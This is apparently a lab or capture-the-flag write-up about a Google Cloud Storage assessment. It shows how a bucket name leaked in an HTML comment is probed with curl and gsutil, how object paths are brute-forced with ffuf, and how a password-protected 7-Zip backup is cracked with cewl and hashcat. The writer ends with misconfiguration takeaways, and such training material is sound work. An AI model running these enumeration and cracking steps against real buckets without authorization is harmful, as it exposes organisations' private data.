---
title: "GCP: Reveal Hidden Files in Google Cloud Storage"
date: 2026-05-10 00:00:00 +00:00
categories: [Cloud Pentesting, GCP]
tags: [gcp, google-cloud-storage, ffuf, hashcat, cewl, gsutil, enumeration, recon]
description: A commented-out image tag leaks a GCS bucket name — from there it's brute-forcing object paths and cracking a password-protected archive.
toc: true
---

## Scenario

Gigantic Retail is a Fortune 50 company that engaged our team to assess the security of their cloud environment. The goal is to demonstrate real impact and show the value of a full engagement. This walkthrough covers how a single commented-out image tag in HTML source can expose a misconfigured GCS bucket and lead to sensitive data.

**Skills covered:**
- Google Cloud CLI (`gsutil`)
- GCS bucket enumeration
- Object brute-forcing with `ffuf`
- Cracking encrypted 7-Zip archives with Hashcat

---

## Recon

**Target:** `https://careers.gigantic-retail.com/index.html`

I started by navigating to the app and running `gospider` to crawl for interesting links and subdomains:

![](/assets/images/gcp-reveal-hidden-files/Pasted%20image%2020260510112940.png)

```bash
gospider -s https://careers.gigantic-retail.com/index.html -w -r --subs -v -d 4
```

| Flag | Purpose |
|------|---------|
| `-w` | Include subdomains from 3rd-party sources |
| `-r` | Include URLs from other sources |
| `--subs` | Include subdomains of the target FQDN |
| `-v` | Verbose output |
| `-d 4` | Crawl depth of 4 |

### GoSpider Output

Nothing interesting — just standard JS and CSS files.

![](/assets/images/gcp-reveal-hidden-files/Pasted%20image%2020260510113208.png)

### Manual Source Review

I manually reviewed the page source and found something GoSpider missed — a GCS object URL buried in an HTML comment:

```html
<img src="https://storage.googleapis.com/it-storage-bucket/images/retail1.jpg" alt="Career Image">
```

![](/assets/images/gcp-reveal-hidden-files/Pasted%20image%2020260510113650.png)

GoSpider and Katana both missed this because they parse the live DOM and follow active links — commented-out content never makes it into their output. Always worth a manual pass.

---

## GCS Enumeration

First I confirmed the referenced object was publicly accessible:

```bash
curl https://storage.googleapis.com/it-storage-bucket/images/retail1.jpg --output retail.jpg
```

![](/assets/images/gcp-reveal-hidden-files/Pasted%20image%2020260510114540.png)

That worked. Trying to list the `images/` directory or the bucket root returned `AccessDenied`:

```bash
curl https://storage.googleapis.com/it-storage-bucket/images/
```

```xml
<Error>
  <Code>AccessDenied</Code>
  <Message>Anonymous caller does not have storage.objects.get access</Message>
</Error>
```

Same result with `gsutil`:

```bash
gsutil ls gs://it-storage-bucket
```

```
ServiceException: 401 Anonymous caller does not have storage.objects.list access
```

This confirms:

- **Bucket exists** ✓
- **Anonymous listing disabled** ✓
- **Direct object access still works** ✓

Since I can reach individual objects but can't list the bucket, the next move is brute-forcing object paths.

---

## Brute-Forcing Object Names

I tried a few standard SecLists wordlists first with no hits. Switching to a backup-file-specific wordlist did the trick:

```bash
wget https://raw.githubusercontent.com/xajkep/wordlists/master/discovery/backup_files_only.txt
```

```bash
ffuf \
  -u https://storage.googleapis.com/it-storage-bucket/FUZZ \
  -w backup_files_only.txt \
  -mc 200,204,301,302,403 \
  -c \
  -fw 26 \
  -e .zip,.json,.html,.7z
```

Got a hit: `backup.7z`

![](/assets/images/gcp-reveal-hidden-files/Pasted%20image%2020260510121706.png)

---

## Downloading the Archive

Both methods work:

```bash
curl https://storage.googleapis.com/it-storage-bucket/backup.7z --output backup.7z
# or
gsutil cp gs://it-storage-bucket/backup.7z .
```

```bash
7z x backup.7z
```

![](/assets/images/gcp-reveal-hidden-files/Pasted%20image%2020260510121810.png)

Password protected. Time to crack it.

---

## Cracking the Archive

Rather than going straight to `rockyou.txt`, I used `cewl` to scrape the target site and build a wordlist from its own content — company-specific passwords often come from the company itself:

```bash
cewl https://careers.gigantic-retail.com/index.html > curated-wl.txt
```

Extracted the hash with `7z2john`:

```bash
7z2john backup.7z > backup.hash
```

Then ran Hashcat with mode `11600` (7-Zip):

```bash
hashcat -m 11600 backup.hash curated-wl.txt
```

![](/assets/images/gcp-reveal-hidden-files/Pasted%20image%2020260510122633.png)

Password: **`balance`** — straight from the site's own content.

```bash
7z x backup.7z
# enter password: balance
```

![](/assets/images/gcp-reveal-hidden-files/Pasted%20image%2020260510122713.png)

Inside: a customer credit review CSV and the flag.

---

## Takeaways

A single commented-out `<img>` tag leaked the bucket name. From there it was confirming what was accessible, picking the right wordlist for brute-forcing, and using the target's own content to crack the archive password.

**The misconfigs that made this possible:**
- Sensitive files stored in a bucket with per-object public access
- No controls preventing anonymous object retrieval
- Archive password derived from publicly visible site content

The `cewl` wordlist being more effective than `rockyou.txt` here is a good reminder — generic wordlists are a fallback, not a first move.
